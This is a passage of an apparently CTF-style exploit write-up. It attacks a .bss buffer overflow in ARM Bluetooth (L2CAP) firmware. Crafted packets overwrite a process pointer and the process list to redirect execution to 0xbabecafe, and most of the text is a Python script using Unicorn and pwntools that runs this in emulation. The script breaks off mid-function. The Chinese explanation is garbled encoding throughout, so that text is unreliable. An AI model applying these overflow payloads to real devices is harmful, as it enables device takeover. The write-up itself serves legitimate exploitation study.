<p>Êé•‰∏ãÊù•Êàë‰ª¨Êù•ÂÜô exp„ÄÇ‰ªîÁªÜËßÇÂØü‰∏Ä‰∏ãÔºåÊ∫¢Âá∫ÂèëÁîüÂú® .bss ÊÆµÔºåËÄåÁêÜËÆ∫‰∏äÊù•ËØ¥Êàë‰ª¨ÂèØ‰ª•ÂêëÂêéÊó†ÈôêÊ∫¢Âá∫„ÄÇÂêéÊñπÂèØ‰ª•ÁúãÂà∞‰∏Ä‰∏™Áõ∏ÂΩìÊúâÂâçÈÄîÁöÑÁªìÊûÑ‰ΩìÊåáÈíà <code>notification_process_0</code>ÔºåÂÆÉ‰ª£Ë°®‰∫Ü‰∏Ä‰∏™ËøõÁ®ãÔºåËÄåËøô‰∏™ËøõÁ®ã‰ºöË¢´ 161 Âè∑‰∏≠Êñ≠ÂáΩÊï∞ <code>pka_isr</code> ÈóÆËØ¢ÔºåÂπ∂ÊåÇÂà∞ÊúÄÂâçÊñπ„ÄÇÂ¶ÇÊûúÊàë‰ª¨Â∞ÜÂÖ∂‰øÆÊîπÊåáÂêë‰∏ÄÊÆµÂèØÊéßÁöÑÂÜÖÂ≠òÔºåÈÇ£‰πàÊàë‰ª¨Â∞±ÂèØ‰ª•‰º™ÈÄ†ËøõÁ®ãÁöÑÂÖ≥ÈîÆÊï∞ÊçÆ„ÄÇÂ¶ÇÊûú‰øÆÊîπÂÖ•Âè£ÁÇπÔºåÈÇ£‰πàÂΩìËØ•ËøõÁ®ãË¢´ËøêË°åÊó∂‰æøÊéßÂà∂‰∫Ü PC„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">pka_isr</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0xE000E290</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x10000</span><span class="p">;</span>
  <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0xE000E190</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x10000</span><span class="p">;</span>
  <span class="n">__dsb</span><span class="p">(</span><span class="mh">0xFu</span><span class="p">);</span>
  <span class="n">__isb</span><span class="p">(</span><span class="mh">0xFu</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">notification_process_0</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">process_poll</span><span class="p">((</span><span class="n">process</span> <span class="o">*</span><span class="p">)</span><span class="n">notification_process_0</span><span class="p">);</span>
    <span class="n">notification_process_0</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>‰ΩÜËøô‰∏™ËøõÁ®ã‰ºº‰πé‰ªéÊù•Ê≤°ÊúâÂêØÂä®ËøáÔºåË¢´ poll ‰πü‰∏ç‰ºöËøêË°å„ÄÇÔºàÊ≥®ÊÑèÔºåÂ¶ÇÂâçÊñáÊâÄËØ¥Ôºå‰∏Ä‰∏™ËøõÁ®ãÂè™ÊúâÂú®Ë¢´ start ‰πãÂêéÊâçËÉΩË¢´ runÔºâ„ÄÇÂ•ΩÊ∂àÊÅØÊòØ <code>process_list</code> ‰πüÂú®Ê∫¢Âá∫ÁÇπÂêéÊñπÔºåÊó¢ÁÑ∂ <code>notification_process_0</code> ‰ªéÊù•Ê≤°ÊúâË¢´ÊåÇ‰∏ä <code>process_list</code>ÔºåÈÇ£‰πàÊàë‰ª¨Â∞±ÊääÂÆÉ‚ÄúÊâãÂä®‚ÄùÊåÇ‰∏äÂéªÔºÅ</p>
<p>ÊÄªÁªì‰∏Ä‰∏ãÂà©Áî®ÊÄùË∑Ø</p>
<ol>
<li>
<p>Âà©Áî®Ê∫¢Âá∫ÁØ°Êîπ <code>notification_process_0</code> ÊåáÈíà‰ΩøÂÖ∂ÊåáÂêëÂèóÊéßÂà∂ÁöÑÂÜÖÂ≠òÂå∫ÂüüÔºàÊØîÂ¶ÇÂâçÈù¢ÊèêÂà∞ÁöÑÂ§ßÁºìÂÜ≤Âå∫ÔºâÔºå‰º™ÈÄ†ÂÖ•Âè£ÁÇπ‰∏∫ 0xbabecafe</p>
</li>
<li>
<p>Âà©Áî®Ê∫¢Âá∫ÁØ°Êîπ <code>process_list</code> ÂàóË°®Â§¥‰∏∫ <code>notification_process_0</code></p>
</li>
<li>
<p>Ëß¶Âèë 161 Âè∑‰∏≠Êñ≠ÔºåÂÆÉÂ∞ÜÊää <code>notification_process_0</code> ËøõÁ®ãÊèêÂà∞ÊúÄÂâçÊñπ„ÄÇÂêéÁª≠ÊâßË°å <code>run_process</code> Êó∂Â∞ÜÈÅçÂéÜ <code>process_list</code> ÂàóË°®Ôºå‰æùÊ¨°Â∞ÜÈúÄË¶Å poll ÁöÑËøõÁ®ãÂêØÂä®ÔºåÂ¶ÇÊ≠§‰æøÂêØÂä®‰∫Ü <code>notification_process_0</code> ËøõÁ®ãÔºå‰ªéÂÖ•Âè£ÁÇπ 0xbabecafe Â§ÑÊâßË°å„ÄÇ</p>
</li>
</ol>
<p>exp Â¶Ç‰∏ã</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">unicorn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">unicorn.arm_const</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>

<span class="kn">import</span> <span class="nn">random</span>

<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;arm&#39;</span>

<span class="n">REGION_START</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">REGION_SIZE</span> <span class="o">=</span> <span class="mh">0x60000000</span>
<span class="n">ROM_BASE</span> <span class="o">=</span> <span class="mh">0x202000</span>

<span class="n">regs</span> <span class="o">=</span> <span class="p">[</span><span class="n">UC_ARM_REG_SP</span><span class="p">,</span> <span class="n">UC_ARM_REG_R0</span><span class="p">,</span> <span class="n">UC_ARM_REG_R1</span><span class="p">,</span> <span class="n">UC_ARM_REG_R2</span><span class="p">,</span> <span class="n">UC_ARM_REG_R3</span><span class="p">,</span> <span class="n">UC_ARM_REG_R12</span><span class="p">,</span> <span class="n">UC_ARM_REG_LR</span><span class="p">]</span>

<span class="n">data_ptr</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">data_len</span> <span class="o">=</span> <span class="mi">0</span>

<span class="n">emu_cnt</span> <span class="o">=</span> <span class="mi">0</span>

<span class="k">def</span> <span class="nf">hook_code</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">data_len</span><span class="p">,</span> <span class="n">data_ptr</span><span class="p">,</span> <span class="n">emu_cnt</span>
    <span class="c1"># if (address &lt; 0x0203D6E and address &gt;= 0x203D5A):</span>
    <span class="c1">#     print(f&#34;[hook code] 0x{address:x}, {size}, {user_data}&#34;)</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x202DBA</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x202DBA: get_channel_for_cid, l2cap_channel_count &#34;</span><span class="p">,</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R0</span><span class="p">),</span> <span class="n">u8</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="mh">0x20002D76</span><span class="p">,</span> <span class="mi">1</span><span class="p">)))</span>
    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x202D9C</span><span class="p">):</span>
        <span class="n">data_ptr</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R0</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x202D9C: packetbuf_dataptr &#34;</span><span class="p">,</span> <span class="n">data_ptr</span><span class="p">)</span>
    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x202DA2</span><span class="p">):</span>
        <span class="n">data_len</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R0</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x202DA2: packetbuf_datalen &#34;</span><span class="p">,</span> <span class="n">data_len</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;data: &#34;</span><span class="p">,</span> <span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">data_ptr</span><span class="p">,</span> <span class="n">data_len</span><span class="p">))</span>
            <span class="c1"># sleep(3)</span>
    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x202D3E</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x202D3E: r3, r4 &#34;</span><span class="p">,</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R3</span><span class="p">),</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R4</span><span class="p">))</span>
    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x202DB4</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x202DB4: r5 &#34;</span><span class="p">,</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R5</span><span class="p">))</span>
    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x202AF2</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x202AF2: len , data&#34;</span><span class="p">,</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R4</span><span class="p">),</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R0</span><span class="p">))</span>
    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x20241E</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x202AF2: payload len &#34;</span><span class="p">,</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R5</span><span class="p">))</span>
    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x20247A</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x20247A: channel-&gt;rx_buffer.sdu_length &#34;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R3</span><span class="p">)))</span>
    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x202482</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x202482: channel-&gt;rx_buffer.current_index &#34;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R2</span><span class="p">)))</span>
    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x2052F0</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x2052F0: p-&gt;state - 1 &#34;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R3</span><span class="p">)))</span>
    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x205412</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x205412: nevents &#34;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R2</span><span class="p">)))</span>
    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x205498</span><span class="p">):</span>
        <span class="n">r3</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R3</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x205498: poll_requested &#34;</span><span class="p">,</span> <span class="n">u8</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">r3</span><span class="p">,</span> <span class="mi">1</span><span class="p">)))</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">emu_cnt</span> <span class="o">==</span> <span class="mi">9</span> <span class="ow">and</span> <span class="n">address</span> <span class="o">==</span> <span class="mh">0x203D5A</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;stop&#34;</span><span class="p">)</span>
        <span class="n">mu</span><span class="o">.</span><span class="n">emu_stop</span><span class="p">()</span>
    <span class="k">pass</span>

<span class="k">def</span> <span class="nf">hook_block</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">access</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">interrupted</span><span class="p">,</span> <span class="n">emu_cnt</span>

    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[hook block] 0x</span><span class="si">{</span><span class="n">address</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">access</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">user_data</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="c1"># interrupt </span>
    <span class="k">if</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x203D5A</span><span class="p">):</span>
        <span class="n">emu_cnt</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Interrupted...&#34;</span><span class="p">)</span>
        <span class="c1"># sleep(3)</span>

        <span class="c1"># save registers</span>
        <span class="n">ptrs</span> <span class="o">=</span> <span class="p">{}</span>
        <span class="k">for</span> <span class="n">reg</span> <span class="ow">in</span> <span class="n">regs</span><span class="p">:</span>
            <span class="n">ptrs</span><span class="p">[</span><span class="n">reg</span><span class="p">]</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">reg</span><span class="p">)</span>
        <span class="n">pc</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_PC</span><span class="p">)</span>
            
        <span class="c1"># execute functions</span>
        <span class="k">if</span> <span class="n">emu_cnt</span> <span class="o">==</span> <span class="mi">8</span><span class="p">:</span>
            <span class="n">interrupt_no</span> <span class="o">=</span> <span class="mi">161</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">interrupt_no</span> <span class="o">=</span> <span class="mi">158</span>
        <span class="n">interrupt_func</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">ROM_BASE</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="p">(</span><span class="n">interrupt_no</span> <span class="o">-</span> <span class="mi">1</span><span class="p">),</span> <span class="mi">4</span><span class="p">))</span>
        <span class="k">if</span> <span class="n">emu_cnt</span> <span class="o">==</span> <span class="mi">8</span><span class="p">:</span>
            <span class="n">mu</span><span class="o">.</span><span class="n">emu_start</span><span class="p">(</span><span class="n">interrupt_func</span><span class="p">,</span> <span class="mh">0x20513C</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">mu</span><span class="o">.</span><span class="n">emu_start</span><span class="p">(</span><span class="n">interrupt_func</span><span class="p">,</span> <span class="mh">0x203B1C</span><span class="p">)</span>

        <span class="c1"># restore</span>
        <span class="k">for</span> <span class="n">reg</span> <span class="ow">in</span> <span class="n">regs</span><span class="p">:</span>
            <span class="n">mu</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">reg</span><span class="p">,</span> <span class="n">ptrs</span><span class="p">[</span><span class="n">reg</span><span class="p">])</span>    <span class="c1"># how to deal with stack?</span>
        <span class="c1"># mu.reg_write(UC_ARM_REG_PC, pc)</span>

        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ok&#34;</span><span class="p">)</span>

    <span class="k">pass</span>
    

<span class="k">def</span> <span class="nf">hook_mem_unmapped</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">access</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[hook_mem_unmapped] </span><span class="si">{</span><span class="n">access</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">address</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">length</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">user_data</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0xbabecafe</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0xbabecafe Bingo!!&#34;</span><span class="p">)</span>
    <span class="k">pass</span>


<span class="n">packet_injected</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">packet_body</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00\x00\x05\x00\x14\x00\x0a\x00</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x20</span>

<span class="n">channel_rx_buffer</span> <span class="o">=</span> <span class="mh">0x200008d4</span>
<span class="n">pc_controlled</span> <span class="o">=</span> <span class="mh">0xbabecafe</span>

<span class="n">packet_injected_2</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">packet_body_2</span> <span class="o">=</span> <span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x72\x00\x41\x00</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xaa\x02</span><span class="s2">&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">channel_rx_buffer</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pc_controlled</span><span class="p">)</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x01</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;eaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfa&#34;</span>


<span class="c1"># override notification_process</span>
<span class="n">packet_injected_3</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">packet_body_3</span> <span class="o">=</span> <span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x72\x00\x41\x00</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xaa\x02</span><span class="s2">&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;aa&#34;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">channel_rx_buffer</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pc_controlled</span><span class="p">)</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x01</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;aafaaagaaahaaaiaaaja&#34;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">channel_rx_buffer</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">channel_rx_buffer</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;aanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfa&#34;</span>

<span class="c1"># override process_list</span>
<span class="n">packet_injected_4_n</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">)]</span>
<span class="n">packet_body_4_n</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x72\x00\x41\x00</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xaa\x02</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaa&#34;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">channel_rx_buffer</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;xaaayaaazaabbaabcaabdaabeaabfa&#34;</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">)]</span>


<span class="k">def</span> <span class="nf">hook_mem_read</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">access</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
